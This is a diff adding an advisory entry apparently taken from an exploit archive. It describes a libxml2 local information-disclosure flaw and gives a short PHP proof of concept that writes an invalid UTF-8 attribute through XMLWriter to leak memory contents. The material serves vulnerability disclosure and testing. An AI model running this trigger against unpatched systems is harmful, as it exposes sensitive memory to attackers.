@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/45973/info
+
+The 'libxml2' library is prone to a local information-disclosure vulnerability.
+
+Attackers can exploit this issue to obtain sensitive information that may lead to further attacks. 
+
+<?php 
+# Copyright 2010, Canonical, Ltd. 
+# Author: Kees Cook <kees@ubuntu.com> 
+# License: GPLv3 
+# 
+# Proof-of-concept memory content leak 
+
+$xw = new XMLWriter(); 
+$xw->openURI('php://output'); 
+
+$xw->startElement('input'); 
+$xw->writeAttribute('value', "\xe0\x81"); 
+$xw->endElement(); 
+
+?>
